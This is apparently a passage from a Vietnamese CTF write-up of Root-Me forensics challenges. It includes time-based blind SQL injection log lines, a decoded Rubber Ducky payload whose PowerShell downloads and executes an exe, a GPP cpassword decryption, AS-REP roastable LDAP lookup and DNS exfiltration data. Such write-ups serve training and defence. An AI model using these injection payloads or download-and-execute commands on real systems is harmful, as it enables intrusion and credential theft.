192.168.1.23 - - [18/Jun/2015:12:13:16 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),3,1),substring(bin(ascii(substring(password,2,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:20 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),5,1),substring(bin(ascii(substring(password,2,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:22 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1) HTTP/1.1" 200 832 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:22 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,3,1))),1,1),substring(bin(ascii(substring(password,3,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),1,1),substring(bin(ascii(substring(password,21,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1007 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),3,1),substring(bin(ascii(substring(password,21,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1007 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),5,1),substring(bin(ascii(substring(password,21,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1007 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:17:02 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1) HTTP/1.1" 200 833 "-" "-"
```

Đây là source code giải quyết thử thách

```python
import sys
from datetime import datetime

f = open("ch13.txt", "r")

timeList = []

char = ''
flag = ""

for line in f:
	timeList += [line[30:38]]

f.close()

for i in range(len(timeList)-1):
	print (datetime.strptime(timeList[i], '%H:%M:%S'))
	print (datetime.strptime(timeList[i+1], '%H:%M:%S'))
	
	timeleft = datetime.strptime(timeList[i+1], '%H:%M:%S') - datetime.strptime(timeList[i], '%H:%M:%S')
	if(i%4 in [0,1,2]):
		if(str(timeleft) == '0:00:00'):
			char += '00'
		if(str(timeleft) == '0:00:02'):
			char += '01'
		if(str(timeleft) == '0:00:04'):
			char += '10'
		if(str(timeleft) == '0:00:06'):
			char += '11'
	if(i%4 == 3):
		if(str(timeleft) == '0:00:02'):
			char += '0'
		if(str(timeleft) == '0:00:04'):
			char += '1'
		print (char)
		flag += chr(int(char,2))
		char = ''

print(flag)

#g9UWD8EZgBhBpc4nTSAS
```

## Find the cat
![image](/assets/data/13.png)

Giải nén ch9.gz ta được 1 ảnh đĩa có bảng phân vùng kiểu MBR (Master Boot Record)

```
file ch9
ch9: DOS/MBR boot sector; partition 1 : ID=0xb, start-CHS (0x0,32,33), end-CHS (0x10,81,1), startsector 2048, 260096 sectors, extended partition table (last)

```
Dùng bộ công cụ ***sleuth kit***

Liệt kê các phân vùng của bộ nhớ

```
mmls ch9
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000262143   0000260096   Win95 FAT32 (0x0b)

```

Liệt kê các file của phân vùng 2048

```
fls -o 2048 -r ch9
d/d 5:  Documentations
+ r/r 25:       tartes_flambee_a_volonte_francais_2013.pdf
+ r/r 28:       mangeur-de-cigogne (1).pdf
+ r/r * 32:     La rÃ©sistance Ã©lectronique.pdf
+ r/r 34:       Menu AC.pdf
+ r/r 54726:    brasserie_jo_dinner_menu.pdf
+ r/r 54729:    Courba13-01.pdf
+ r/r 54731:    m-flamm.pdf
+ r/r 54734:    Barbey_Cigognes_BDC.pdf
+ r/r * 54738:  Anarchie, indolence & synarchie.pdf
+ r/r * 178246: anarchistscookbookv2000.pdf
+ r/r 178250:   texte_migration_des_cigognes.pdf
+ r/r 178253:   mangeur-de-cigogne.pdf
d/d 7:  Files
+ r/r * 246775: revendications.odt
+ r/r 246778:   421_20080208011.doc
+ r/r 246780:   Coker.doc
+ r/r 246784:   DataSanitizationTutorial.odt
+ r/r 363796:   Creer_votre_association.doc
d/d 9:  WebSites
+ d/d 365610:   Apple - iPhone - iPhone 4 Technical Specifications_files
....
```
Có rất nhiều các file nhưng mình để ý có 1 file ***revendications.odt*** đã bị xóa nhưng ta vẫn có thể kéo về được

```
icat -o 2048 ch9.img  246775 >  revendications.odt
```

Mở ra ta thấy 1 hình con meowww, dùng binwalk để tách ảnh ra ``` binwalk -e revendications.odt```

Sau đó dùng exiftool để xem thông tin ảnh

```
exiftool 1000000000000CC000000990038D2A62.jpg
ExifTool Version Number         : 13.25
File Name                       : 1000000000000CC000000990038D2A62.jpg
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2013:07:22 21:25:22+07:00
File Access Date/Time           : 2025:06:27 21:49:05+07:00
File Inode Change Date/Time     : 2025:05:19 18:49:12+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Make                            : Apple
Camera Model Name               : iPhone 4S
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : 6.1.2
Modify Date                     : 2013:03:11 11:47:07
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/20
F Number                        : 2.4
Exposure Program                : Program AE
ISO                             : 160
Exif Version                    : 0221
Date/Time Original              : 2013:03:11 11:47:07
Create Date                     : 2013:03:11 11:47:07
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/20
Aperture Value                  : 2.4
Brightness Value                : 1.477742947
Metering Mode                   : Multi-segment
Flash                           : Off, Did not fire
Focal Length                    : 4.3 mm
Subject Area                    : 1631 1223 881 881
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 3264
Exif Image Height               : 2448
Sensing Method                  : One-chip color area
Exposure Mode                   : Auto
White Balance                   : Auto
Focal Length In 35mm Format     : 35 mm
Scene Capture Type              : Standard
GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 07:46:50.85
GPS Img Direction Ref           : True North
GPS Img Direction               : 247.3508772
Compression                     : JPEG (old-style)
Thumbnail Offset                : 902
Thumbnail Length                : 8207
Image Width                     : 3264
Image Height                    : 2448
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Aperture                        : 2.4
Image Size                      : 3264x2448
Megapixels                      : 8.0
Scale Factor To 35 mm Equivalent: 8.2
Shutter Speed                   : 1/20
Thumbnail Image                 : (Binary data 8207 bytes, use -b option to extract)
GPS Altitude                    : 16.7 m Above Sea Level
GPS Latitude                    : 47 deg 36' 16.15" N
GPS Longitude                   : 7 deg 24' 52.48" E
Circle Of Confusion             : 0.004 mm
Field Of View                   : 54.4 deg
Focal Length                    : 4.3 mm (35 mm equivalent: 35.0 mm)
GPS Position                    : 47 deg 36' 16.15" N, 7 deg 24' 52.48" E
Hyperfocal Distance             : 2.08 m
Light Value                     : 6.2
```
Ta thấy có định vị GPS

```
GPS Position: 47 deg 36' 16.15" N, 7 deg 24' 52.48" E
```
![image](/assets/data/14.png)

Và đây là ```Helfrantzkirch, Pháp```

## Ugly Duckling

![image](/assets/data/15.png)

Giải nén ch14.zip ta được file.bin, đây là 1 ổ USB lạ chứa tệp nhị phân

Ta sẽ dùng kho lưu trữ này để giải mã tệp nhị phân trên 
http://github.com/JPaulMora/Duck-Decoder

```
python2 DuckDecoder.py decode ../file.bin


DELAY 5100

STRING iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpg
ENTER
DELAY 4000

CONTROL S
DELAY 2000


DELAY 600

STRING %USERPROFILE%Documents796f75277665206265656e2054524f4c4c4544.jpg
DELAY 500


DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500

STRING TAB
DELAY 500


DELAY 500

STRING DOWN
DELAY 500

STRING DOWN
DELAY 500

STRING DOWN
DELAY 500

STRING DOWN
DELAY 500


DELAY 500

STRING DOWN
DELAY 500

STRING DOWN
DELAY 500


DELAY 500

STRING powershell Start-Process powershell -Verb runAs
DELAY 500

STRING PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
```

Điều chú ý ở đây là phần powerShell bị làm rối bằng base64

```
STRING PowerShell -Exec ByPass -Nol -Enc 
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AA
powershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoA
exit
```

Giải mã ra ta được

```
iex ((New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c616776765643f.exe','666c61676765643f.exe'));

iex ((New-Object -com shell.application).shellexecute('666c61676765643f.exe'));
```

Nó sẽ tải file ***666c616776765643f.exe*** từ ***http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe*** và thực thi nó

Tải về và thực thi ta có được flag

## Windows - LDAP User ASRepRoastable

![image](/assets/data/16.png)

Dùng kho lưu trữ này để phân tích
https://github.com/p0dalirius/ldap2json

```
 python3 analysis.py -f ../../ch32.json
[>] Loading ../../ch32.json ... done.
[]> help
 - searchbase                          Sets the LDAP search base.
 - object_by_property_name             Search for an object containing a property by name in LDAP.
 - object_by_property_value            Search for an object containing a property by value in LDAP.
 - object_by_dn                        Search for an object by its distinguishedName in LDAP.
 - search_for_kerberoastable_users     Search for users accounts linked to at least one service in LDAP.
 - search_for_asreproastable_users     Search for users with DONT_REQ_PREAUTH parameter set to True in LDAP.
 - help                                Displays this help message.
 - exit                                Exits the script.
[]> search_for_asreproastable_users
[CN=Fitzgerald,CN=Users,DC=ROOTME,DC=local] => userAccountControl
 - 4260352
```
Dùng ```object_by_dn CN=Fitzgerald,CN=Users,DC=ROOTME,DC=local``` để liệt kê thông tin của người dùng Fitzgerald

```
"name": "Fitzgerald",
    "objectGUID": "{f3c1fa29-268a-4092-b183-bbe6c837ad79}",
    "userAccountControl": 4260352,
    "badPwdCount": 0,
    "codePage": 0,
    "countryCode": 0,
    "badPasswordTime": "1601-01-01 00:00:00",
    "lastLogoff": "1601-01-01 00:00:00",
    "lastLogon": "1601-01-01 00:00:00",
    "pwdLastSet": "2022-08-30 03:44:38",
    "primaryGroupID": 513,
    "objectSid": "S-1-5-21-1356747155-1897123353-4258384033-2027",
    "accountExpires": "9999-12-31 23:59:59",
    "logonCount": 0,
    "sAMAccountName": "flandry",
    "sAMAccountType": 805306368,
    "objectCategory": "CN=Person,CN=Schema,CN=Configuration,DC=ROOTME,DC=local",
    "dSCorePropagationData": [
        "1601-01-01 00:00:00"
    ],
    "msDS-SupportedEncryptionTypes": 0,
    "mail": "fitzgerald.landry@rootme.local"
```

## Active Directory - GPO

![image](/assets/data/17.png)

Ta được cung cấp 1 file ch12.pcap 

Dùng wireshark để phân tích file pcap này, vì lưu lượng mạng trong quá trình khởi động của máy trạm được đăng ký trong Active Directory đã được ghi lại nên ta sẽ folow theo ***SMB/SMB2***

Để xem các file được truyền qua bằng giao thức smb ta vào 
```File => Export Objects => SMB ``` tải về 

```
 cat %5cnilux.me%5cPolicies%5c{F60A1B1E-75E4-46B7-BB73-281F9340A2B7}%5cMachine%5cPreferences%5cGroups%5cGroups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Helpdesk" image="2" changed="2015-05-06 05:50:08" uid="{43F9FF29-C120-48B6-8333-9402C927BE09}"><Properties action="U" newName="" fullName="" description="" cpassword="PsmtscOuXqUMW6KQzJR8RWxCuVNmBvRaDElCKH+FU+w" changeLogon="1" noChange="0" neverExpires="0" acctDisabled="0" userName="Helpdesk"/></User><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrateur" image="2" changed="2015-05-05 14:19:53" uid="{5E34317F-8726-4F7C-BF8B-91B2E52FB3F7}" userContext="0" removePolicy="0"><Properties action="U" newName="" fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrateur"/></User>
</Groups>
```

Ta sẽ thấy cpassword của Admin

```
fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0"
```

Dùng **gpp-decrypt** để giải mã

```
 gpp-decrypt LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0

#TuM@sTrouv3
```

## Exfiltration DNS

![image](/assets/data/19.png)

Thử thách cho ta tệp ch21.pcap, ta sẽ dùng wireshark để phân tích 

Đề bài là Exfiltration DNS đây là gợi ý khi thông điệp được chia nhỏ từng phần ra và giấu vào bằng phân giải dns

![image](/assets/data/20.png)

Ta sẽ lọc ra hoặc chỉ ```request``` hoặc chỉ ```response```

Dùng ```tshark``` để lấy phần nội dung của tất cả các bản ghi
```
tshark -r ch21.pcap -Y "ip.dst == 192.168.56.101 && dns.flags.response == 1" -T fields -e dns.qry.name > dns.txt
```

```
65be01241015bae363.jz-n-bs.local
019d01241015bae363.jz-n-bs.local
6c0601241015bae37400001b158001000389504e470d0a1a0a0000000d49.48445200000280000001e0080600000035d1dce400000006624b474400ff.00ff00ffa0bda793000000097048597300000b1300000b1301009a9c1800.00000774494d4507e1061b083806e97b0fcf.jz-n-bs.local
584c012410161de3740000001974455874436f6d6d656e74004372656174.656420776974682047494d5057810e1700001a794944415478daeddd7b70.54e5e1f8e137404092004a0404a4515b151544500449b5c5762ace042d54.c6b6761c914e71da2a5a2cb6a3d55a3bda61.jz-n-bs.local
45f40124101680e3746cada3e8a8ad8a565bb9e3a55ea88dce28820a946a.0c8a5a44915b1b05040231bcbf3f7e5fceec926cae9b9b3ccf4c6636d9b3.2767dfdd3dfbd9dd73cee6c418630000e0a0d1c910000008400000042000.000210000001080080000400400002002000.jz-n-bs.local
6a4101241016e3e374010010800000084000000420000002100000010800.800004001080000008400000042000000210000001080080000400400002.002000010010800000084000000420000002100000010800800004001080.000008400000042000000210000001080080.jz-n-bs.local
1f810124101746e374000400400002002000010010800000084000000420.000002100000010800200001001080000008400000042000000210000001.080080000400400002002000010010800000084000000420000002100000.010800200001001080000008400000042000.jz-n-bs.local
2d0d01241017a9e374000210000001080080000400400002002000010010.800000084000000420000002100040000200200001001080000008400000.042000000210000001080080000400400002002000010010800000084000.000420000002100040000200200001001080.jz-n-bs.local
2d26012410180ce374000008400000042000000210000001080080000400.400002002000010010800000084000000420000002100040000200200001.001080000008400000042000000210000001080080000400400002002000.010010800000084000000420008000040040.jz-n-bs.local
5f29012410186fe374000200200001001080000008400000042000000210.000001080080000400400002002000010010800000084000000420008000.040040000200200001001080000008400000042000000210000001080080.000400400002002000010010800000084000.jz-n-bs.local
4d2b01241018d2e374000108008000040040000200200001001080000008.400000042000000210000001080080000400400002002000010010800000.084000000108008000040040000200200001001080000008400000042000.000210000001080080000400400002002000.jz-n-bs.local
131f0124101935e374010010800000021000000108008000040040000200.200001001080000008400000042000000210000001080080000400400002.002000010010800000021000000108008000040040000200200001001080.000008400000042000000210000001080080.jz-n-bs.local
52440124101998e374000400400002002000010010800000021000000108.008000040040000200200001001080000008400000042000000210000001.0800800004004000020020000100042000000210bea056ad5a152ebbecb2.307cf8f050585818ba75eb167272720c4c1d.jz-n-bs.local
1ba401241019fbe374727272921fd713dc1fb3b57c393939a15bb76ea1b0.b0309c72ca2961ead4a961d5aa556efcd6b8fd628cd13074fc954443d576.73a75e3e1b77876f7ffbdb61f1e2c52184104a4a4ac2134f3cd1e879ecdb.b72f3cfef8e3e1c9279f0cafbcf24ad8bc79.jz-n-bs.local
426f0124101a5ee37473d8be7d7be8d9b367282a2a0a679c714698387162.183b766ca3aeff4b2fbd14ce3efbec505555d5a0b169ecf866731cb3791b.6fdcb831ac5cb932ed67fdfaf50d5ede6cdf479aabaaaa2a8c1a352aed89.221bcbd5deae674b68ee7d211bf7c7d6bebe.jz-n-bs.local
10550124101ac1e374b7df7e7b78f2c927c3071f7c104208a1a8a8289494.94842bafbc321c71c411adba4ececfcf0f03070e0ca3478f0e53a64c0967.9d7556d6ef8f2df5f86889c74b6d63959b9b1b4a4b4b437171b127f89614.e9f042080dfea9eff2cdb565cb96989b9b9b.jz-n-bs.local
46560124101b24e374ccaf4b972e71d3a64d8d9ac7cb2fbf1c870c19d2a0.eb73fcf1c7c7279f7cb2c1f32e2929492e3b61c284585e5e1ef7ecd993b5.f1cdd638b6e46ddc94e56dcdfb50435c77dd750dbe0ed9bc9e07c3faa235.ee8fad65c99225f1b0c30ecbb86cbd7bf78e.jz-n-bs.local
31580124101b87e374fff8c73fdaf4f17ad96597c5eaeaeaacde1f1bf3f8.c8d6f56c8e3d7bf6c4356bd6c489132726f31b3f7ebc27f7965e1718822f.d60abd2d1fc431c678db6db7d558f1dc7aebad0dbefc9c397362b76edd92.cb4e9c38312e58b0207ef4d147b1b2b2326e.jz-n-bs.local
049e0124101beae374d9b225bef4d24bf1f2cb2f8f3d7bf66cf472f7eddb.37b9ccbbefbedbeae3d356b771fffefd63494949bce1861be2e38f3f1e37.6cd8d0610370f9f2e5b173e7ce313f3f3feb01783068ee7da1a38c695959.592c282888218498979717efb9e79e585151.jz-n-bs.local
041c0124101c4de374112b2a2ae23df7dc13f3f2f2620821161414c4b7de.7aab551eaf9f7ffe795cb76e5dbcf3ce3b63af5ebd9269eeb8e38eac8d73.631f1fed2100f75bbb766d32bf7efdfa79b00a403a52000e1b36ac46000e.1d3ab441975dbd7a753ce490439215767def.jz-n-bs.local
01e90124101cb0e374ec6dd8b0214e9830a151cbdda54b9764b93efffcf3.8326005bfa9db1d61aa35dbb76c5e38f3f3e8610e29d77de2900dbe8fed5.11c6f49c73ce499671debc7935ce9f376f5e72feb871e35a7d3c67cf9e5d.ef3ab2b1e3dc94c7477b5a2f555555a57d7a.jz-n-bs.local
2ddd0124101d13e3748400a48304e0aa55ab92f974efde3d79f51d4288af.bffe7abd971f3d7a7432fdecd9b31bf43ff7eddb17a74f9fdea2d75500b6.9f00bce28a2b6208219e7df6d971dfbe7d025000d6aabcbc3c59bee1c387.679c6ef8f0e1c9746fbffd76ab8ee7962d5b.jz-n-bs.local
297d0124101d76e37492690e39e490ac8c73531e1f1d79bd44f3d80b98ac.79f0c10793d313264c0893264d4a7e9f3d7b76bd3b672c5bb62c8410c229.a79c122ebef8e2066f407cebadb7b6db31993c7972b2975c7e7e7e282b2b.ab314d595959c8cfcf4fa69b3c797287db4b.jz-n-bs.local
60bf0124101dd9e37431d39e81f59d1f4208dbb76f0f37de786338e9a493.425e5e5ec60de84b4b4bc31d77dc117af4e811eebffffe7a7744c8c6b2d5.e5f5d75f0f53a64c09c71e7b6cc8cfcf0ff9f9f9e1d8638f0d3ffce10fc3.ca952b1bbce7e4fffef7bf306ddab4505454.jz-n-bs.local
2bbe0124101e3ce374140e39e4903078f0e070cb2db7d4baa3d2c168e7ce.9de177bffb5d18356a5438f4d04343972e5d42af5ebdc2f0e1c3c3e5975f.1e962f5f5ee3320b162c484e5f70c10519e79d7adefcf9f3dbec3a161616.367b1e8d7d7cd466ebd6ade1b7bffd6d38f3.jz-n-bs.local
369a0124101e9fe374cc3343dfbe7d436e6e6ee8d9b367183e7c7898366d.5a78edb5d71a3caf0f3ffc300c1e3c38edfe3e73e64c77683b81f0457b07.70efdebdb14f9f3ec97c9e7beeb9f8c20b2f24bf1f7ef8e171efdebd192f.7ff5d55727d3fefef7bf6f5763d59cf1d9b9.jz-n-bs.local
37100124101f02e3747367da0e2d279c7042fcecb3cf92f377ecd811070f.1e9c9c3f64c890b86bd7ae0ef30e6053760448fdfba64d9b6adde1e740db.b66d8b454545318410efbdf7de065d87e62e5b26d5d5d571faf4e975ce33.2727275e73cd3571dfbe7d752ed7e6cd9bd3.jz-n-bs.local
20d70124101f65e3746effd49f0b2fbcf0a07f0770d3a64dc9479a8dd9d1.e4fcf3cf4fceab6b278f254b96a4ed14d69ae3f9d0430f25d34c9a34a959.e3dc94c7476dcb73e076834d7dbc949797c741830625e775eedc39de77df.7dde01f411305fc4005cb87061328f418306.jz-n-bs.local
04b10124101fc8e374c5eaeaeab86fdfbe78d45147257f9f3f7f7ec6cb9f.71c619c9742fbffc728b8cd3f6eddbebfdc8a525c6a7bcbc3cede3f0ef7f.fffbc979dffbdef792bf171414c4356bd67ce13f024e9d76c28409f1a8a3.8e8a73e7ce8d9f7cf249c6cb5c72c9253184.jz-n-bs.local
36e0012410202be37410cf39e79c46ffdf6cef057cedb5d726d30c1c3830.ce9933276edbb62d6edbb62d3ef6d86371c08001c9f937dc70439dff63e2.c48971fcf8f1b1bcbc3c565656c6850b17263b278410e233cf3cd3ee03f0.ab5ffd6aecd5ab57ecdab56b1c3060403cff.jz-n-bs.local
16a7012410208ee374fcf3e39c397332eed9da18975e7a69f27f468c1811.fff9cf7fc68a8a8ab867cf9ef8fefbefc7d9b367c733cf3cb3c6e58e3bee.b8e472efbdf75ec6f9bffbeebb69471468e9f1fcfcf3cfe3faf5ebe3dd77.df9dec9ddca74f9f8c1f3f37f47669cee323.jz-n-bs.local
351301241020f1e374c6181f78e08164badcdcdc387dfaf4b87af5eab86b.d7aeb86bd7aef8e69b6fc659b366c5d34f3fbddef9bffefaebf1f0c30f4f.fedeb56bd75ab7c1cc247527c01d3b7678821780347465d394c33164232e.525f715f7bedb5c9dfafbffefa06edd6dfbf.jz-n-bs.local
24e70124102154e3747fff64ba2d5bb6b4c8383dfffcf3c9ff38f9e493b3.3ebe758de1238f3c9236cddd77df1defbaebaeb4bf3df2c8232d761bb7d7.003cecb0c3e2871f7e58e7f48b172f8e2184d8ab57aff8d1471fb56900be.fdf6dbb153a74e318410f3f3f3e3dab56b6b.jz-n-bs.local
7c4401241021b7e3749d667fc475ead4a9c634a9ffe384134ea8f1cef88d.37de989c7fd14517b5fb00ccf4f3b5af7d2d6eddbab559cb95faa942a617.47b5493df44b5d1191faa2b0b0b0b055d7c9fdfbf78f575d7555dcb06143.b36e97e63e3e366edc18bb77ef9edc5f9f78.jz-n-bs.local
6729012410221ae374e28926df6f4a4b4b638f1e3dd25ed42e59b2a45163.97fa89c0f3cf3fef095e00d29e03f0c063ffa53ee1bdf7de7b31272727d9.ab6bf3e6cdb5ce63ffdebf218458595999d5f1f9ecb3cf62696969da476d.77de7967ab06608c314e9d3a3599a65bb76e.jz-n-bs.local
6629012410227de37469af74a74e9ddaa2b7717b0dc0dade214bb575ebd6.d8af5fbf1842880f3ef86093fe6f36afe7cf7ef6b3e4fc6baeb926e37c52.3769b8faeaab33fe8fbbefbebbc6655377a63aeeb8e3da65009e76da69f1.f6db6f8fab57af8e3b77ee8c7bf6ec89efbc.jz-n-bs.local
763a01241022e0e374f34e9c3973663cf4d04393798d1933a6c17bdbd726.75bd52dff13a335daeaaaa2ae374a97b9d76eddab555d7c99d3a758a63c7.8ead33b8eabb5db2f1f8f8d5af7e954c3379f2e4265fcfc58b17a7adc70b.0b0be3f2e5cb1b3d767ffce31fd35e209596.jz-n-bs.local
5d410124102343e37496a66d368300248b01d7dccba71efbafb8b8b8c6f9.679e796672fe1ffef087660560730e809c939313870e1d9ab68d4c6b8ccf.7e959595697b1da6eea5b87bf7ee565986f61680afbdf65a9dd37ee73bdf.a9f3dde3d60ec011234624e72f5bb62ce37c.jz-n-bs.local
3aa101241023a6e374962e5d9a4c77eaa9a766fc1fb51d7f2ef55da98282.820eb10e39f01dd0d48f001f78e08126cf6be8d0a169dbc9cd9f3f3feedc.b9b34305606d2f48972d5b966cfe91939313afbffefa26dd2ed9787c8c1a.352a99a6b4b4b4c9d733f5105b03070e8c65.jz-n-bs.local
671c0124102409e37465654d1ebf7beeb9270e1d3a3479f3c03681029076.1a80a9c7feab6d43df3ffde94fc9f9c3860dab751ea9db4dd5f511707303.70e4c891756e8bd8d24f8eefbefb6eda01607bf6ec59ebc788074b006edb.b62de3740f3ffc70f26d0d1f7ffc71bb08c0.jz-n-bs.local
17e9012410246ce374d477b73efdf4d38cf3f9e4934fd2be6d22d3ffd8be.7d7b8dcba61ebe232727a7c305608c31ce9a352b99dfb7bef5ad26cf67ee.dcb9351ee779797971fcf8f1f1cf7ffe73c67786dad347c075b9e8a28b92.e9162d5ad4a8f964ebf1d1bb77ef649a8a8a.jz-n-bs.local
460d01241024cfe3748a66bfd379ecb1c7c675ebd6356bfce6cf9f1f478e.1c29000520ed3900533faecacbcbabf5097ddbb66d691bb6af5cb9b2c634.63c68c69d24e200d59f64f3ffd342e58b020ed5b40e6cc99d3264f8e5555.5569c17cde79e7b5c913747b09c0daf6923d.jz-n-bs.local
0b060124102532e37430b61aba6d646b5ccfce9d3b37e840e2751dd0b63d.1ebb30dbffefc30f3f4ce6d7a74f9f66bd887be28927e249279d54ebf447.1c71447cfae9a76b5ca6bdee0472a0152b5624d37de31bdf68d47cb2f5f8.487de7aeae774b1b1a80c3860dab7387aefa.jz-n-bs.local
13af0124102595e3743cf6d86369df06b268d1a23a5f28220005601b05e0.b469d31abd8ddc15575c51633ebff8c52f9a741898c62c7bea9e6eb57d54.dd1a4f8ea9dbdbecfff9dbdffe76d00660639f5c5aead02e4d7907b0ae27.a586be03f8450dc0bd7bf7a6ed55da9c00dc.jz-n-bs.local
